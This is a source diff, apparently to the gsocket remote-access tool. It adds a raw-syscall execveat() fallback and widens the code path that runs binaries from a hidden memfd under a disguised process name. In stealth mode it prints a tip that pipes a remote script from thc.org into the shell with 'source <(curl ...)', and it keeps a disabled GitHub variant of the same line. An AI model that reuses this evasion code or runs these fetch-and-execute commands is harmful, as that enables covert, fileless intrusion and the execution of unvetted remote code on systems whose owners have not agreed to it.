@@ -93,9 +93,17 @@ cpy(int dst, int src) {
 	}
 }
 
+#ifndef HAVE_EXECVEAT
+# warning "No native execveat() support. Using direct syscall(281, ..) instead."
+static int
+execveat(int fd, const char *pathname, char *const argv[], char *const *envp, int flags) {
+	return syscall(281 /*__NR_execveat*/, fd, pathname, argv, envp, flags);
+}
+#endif
+
 static int
 try_memexecme(int src, char *argv[]) {
-#if defined(HAVE_SYS_MMAN_H) && defined(HAVE_SYS_SENDFILE_H)
+#if defined(HAVE_SYS_MMAN_H)
 	int fd;
 	if ((fd = memfd_create(gopt.proc_hiddenname, MFD_CLOEXEC)) < 0)
 		return -1;
@@ -1579,8 +1587,10 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		printf("\
 =Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n");
-// 		printf("\
-// =Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
+#if 0
+		printf("\
+=Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
+#endif
 	}
 	if (GS_getenv("PS1") == NULL) {
 		// Note: This only works for /bin/sh because some bash reset this value.
